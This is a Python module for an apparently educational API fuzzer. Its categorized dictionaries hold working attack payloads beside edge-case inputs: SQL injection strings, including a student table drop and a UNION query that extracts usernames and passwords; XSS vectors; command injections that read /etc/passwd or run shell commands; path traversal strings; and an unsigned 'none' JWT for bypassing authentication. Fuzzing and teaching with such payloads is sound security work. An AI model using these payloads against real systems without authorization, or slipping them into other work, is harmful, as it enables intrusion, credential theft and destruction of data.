"""
payloads.py — Categorized Fuzz Testing Payload Library
EdTech API Fuzzer | Ethical Hacking Educational Module

IMPORTANT: Use only on systems you are authorized to test.
These payloads are strictly for educational and authorized pentesting purposes.
"""

# ─────────────────────────────────────────────
# STRING EDGE CASES
# ─────────────────────────────────────────────
STRINGS = {
    "empty_string":         "",
    "single_space":         " ",
    "whitespace_only":      " " * 50,
    "newline":              "\n",
    "tab":                  "\t",
    "carriage_return":      "\r\n",
    "long_string_500":      "A" * 500,
    "long_string_5000":     "A" * 5000,
    "unicode_chars":        "Ωµπ∞∑√≈ƒ∂∆",
    "null_char":            "\x00",
    "null_in_string":       "admin\x00user",
    "format_string":        "%s%s%s%s%s%s%s%s",
    "format_percent":       "%%20%%20%%20",
    "emoji_string":         "🔥💻🛡️🚨⚡",
    "very_long_unicode":    "ñ" * 300,
}

# ─────────────────────────────────────────────
# SECURITY PAYLOADS — SQL INJECTION
# ─────────────────────────────────────────────
SQL_INJECTION = {
    "sqli_classic":         "' OR '1'='1",
    "sqli_comment":         "'; --",
    "sqli_drop":            "'; DROP TABLE students; --",
    "sqli_union":           "' UNION SELECT null, username, password FROM users --",
    "sqli_sleep":           "'; WAITFOR DELAY '0:0:5'; --",
    "sqli_blind":           "' AND 1=1 --",
    "sqli_boolean":         "' AND 1=2 --",
    "sqli_stacked":         "1; SELECT * FROM information_schema.tables --",
    "sqli_error_based":     "' AND extractvalue(1, concat(0x7e, version())) --",
    "sqli_time_based":      "' OR SLEEP(3) --",
}

# ─────────────────────────────────────────────
# SECURITY PAYLOADS — CROSS-SITE SCRIPTING (XSS)
# ─────────────────────────────────────────────
XSS = {
    "xss_script_basic":     "<script>alert('XSS')</script>",
    "xss_img_onerror":      "<img src=x onerror=alert('XSS')>",
    "xss_svg":              "<svg/onload=alert('XSS')>",
    "xss_event_handler":    "\" onmouseover=\"alert('XSS')",
    "xss_encoded":          "&lt;script&gt;alert(1)&lt;/script&gt;",
    "xss_url_encoded":      "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
    "xss_double_encoded":   "%253Cscript%253Ealert(1)%253C%252Fscript%253E",
    "xss_iframe":           "<iframe src=javascript:alert('XSS')>",
    "xss_body_tag":         "<body onload=alert('XSS')>",
    "xss_no_quotes":        "<script>alert(String.fromCharCode(88,83,83))</script>",
}

# ─────────────────────────────────────────────
# SECURITY PAYLOADS — COMMAND INJECTION
# ─────────────────────────────────────────────
COMMAND_INJECTION = {
    "cmd_semicolon":        "; ls -la",
    "cmd_pipe":             "| cat /etc/passwd",
    "cmd_ampersand":        "&& id",
    "cmd_backtick":         "`whoami`",
    "cmd_subshell":         "$(id)",
    "cmd_newline":          "\n/bin/bash -c 'id'",
    "cmd_windows":          "& dir C:\\",
    "cmd_null_byte":        "test\x00; ls",
}

# ─────────────────────────────────────────────
# SECURITY PAYLOADS — PATH TRAVERSAL
# ─────────────────────────────────────────────
PATH_TRAVERSAL = {
    "traversal_basic":      "../../../etc/passwd",
    "traversal_windows":    "..\\..\\..\\Windows\\System32",
    "traversal_encoded":    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "traversal_double_enc": "..%252f..%252f..%252fetc%252fpasswd",
    "traversal_absolute":   "/etc/passwd",
    "traversal_null":       "../../../etc/passwd\x00.jpg",
}

# ─────────────────────────────────────────────
# NUMERIC EDGE CASES
# ─────────────────────────────────────────────
NUMERIC = {
    "zero":                 0,
    "negative":             -1,
    "negative_large":       -9999999,
    "max_int":              2**31 - 1,       # 2147483647
    "overflow_int":         2**63,
    "float_nan":            float("nan"),
    "float_inf":            float("inf"),
    "float_neg_inf":        float("-inf"),
    "scientific":           1e308,
    "tiny_float":           1e-308,
    "hex_string":           "0xFF",
    "octal_string":         "0o777",
}

# ─────────────────────────────────────────────
# TYPE CONFUSION
# ─────────────────────────────────────────────
TYPE_CONFUSION = {
    "boolean_true":         True,
    "boolean_false":        False,
    "null_value":           None,
    "empty_list":           [],
    "nested_list":          [1, 2, [3, 4]],
    "empty_dict":           {},
    "nested_dict":          {"key": {"nested": "value"}},
    "integer_string":       "123456",
    "float_string":         "3.14159",
    "bool_string":          "true",
}

# ─────────────────────────────────────────────
# AUTHENTICATION BYPASS PAYLOADS
# ─────────────────────────────────────────────
AUTH_BYPASS = {
    "admin_string":         "admin",
    "admin_variation":      "Admin",
    "admin_null":           "admin\x00",
    "jwt_none":             "eyJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIn0.",
    "empty_token":          "",
    "bearer_null":          "Bearer null",
    "bearer_undefined":     "Bearer undefined",
}

# ─────────────────────────────────────────────
# EDTECH-SPECIFIC PAYLOADS
# (targeting common EdTech fields)
# ─────────────────────────────────────────────
EDTECH_SPECIFIC = {
    "student_id_negative":  -1,
    "student_id_zero":      0,
    "student_id_overflow":  99999999999,
    "course_id_sql":        "CS101' OR 1=1--",
    "grade_overflow":       101,
    "grade_negative":       -10,
    "grade_string":         "A+' OR '1'='1",
    "email_xss":            "student<script>alert(1)</script>@edu.com",
    "email_long":           "a" * 200 + "@test.com",
    "enrollment_date_bad":  "not-a-date",
    "enrollment_date_sql":  "2024-01-01' OR '1'='1",
}

# ─────────────────────────────────────────────
# ALL PAYLOADS COMBINED (flat dict for fuzzer)
# ─────────────────────────────────────────────
ALL_PAYLOADS = {
    **STRINGS,
    **SQL_INJECTION,
    **XSS,
    **COMMAND_INJECTION,
    **PATH_TRAVERSAL,
    **NUMERIC,
    **TYPE_CONFUSION,
    **AUTH_BYPASS,
    **EDTECH_SPECIFIC,
}
